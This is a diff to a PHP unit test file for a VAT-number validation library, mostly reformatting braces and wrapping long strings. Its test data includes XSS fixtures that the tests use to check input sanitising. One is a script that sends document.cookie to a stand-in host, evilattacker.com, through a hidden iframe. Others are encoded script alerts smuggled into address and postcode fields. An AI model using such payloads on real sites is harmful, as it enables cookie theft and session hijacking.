@@ -367,8 +367,7 @@ class ViestTest extends TestCase
     public function testValidateVatSumToThrowException(
         string $countryCode,
         string $vatId
-    )
-    {
+    ) {
         $vies = new Vies();
         $this->expectException(ViesException::class);
         $vies->validateVatSum($countryCode, $vatId);
@@ -433,7 +432,7 @@ class ViestTest extends TestCase
             [
                 'HackThePlanet',
                 '<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'
-    + document.cookie.escape() + \'" height=0 width=0 />\');</script>',
+                + document.cookie.escape() + \'" height=0 width=0 />\');</script>',
                 'Main Street 1',
                 '1000',
                 'Some Town',
@@ -441,7 +440,8 @@ class ViestTest extends TestCase
             [
                 'HackThePlanet',
                 'Ltd',
-                "Main Street 1\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22\x78\x73\x73\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e",
+                "Main Street 1\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22"
+                . "\x78\x73\x73\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e",
                 '1000',
                 'Some Town',
             ],
@@ -449,7 +449,8 @@ class ViestTest extends TestCase
                 'HackThePlanet',
                 'Ltd',
                 'Main Street 1',
-                '1000<?php echo url_decode("%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e") ?>',
+                '1000<?php echo url_decode("%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78'
+                . '%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e") ?>',
                 'Some Town',
             ],
             [
@@ -482,8 +483,7 @@ class ViestTest extends TestCase
         string $traderStreet,
         string $traderPostcode,
         string $traderCity
-    )
-    {
+    ) {
         $viesRef = new \ReflectionClass(Vies::class);
         $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
         $addOptionalArguments->setAccessible(true);
@@ -537,8 +537,7 @@ class ViestTest extends TestCase
         string $traderStreet,
         string $traderPostcode,
         string $traderCity
-    )
-    {
+    ) {
         $viesRef = new \ReflectionClass(Vies::class);
         $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
         $addOptionalArguments->setAccessible(true);
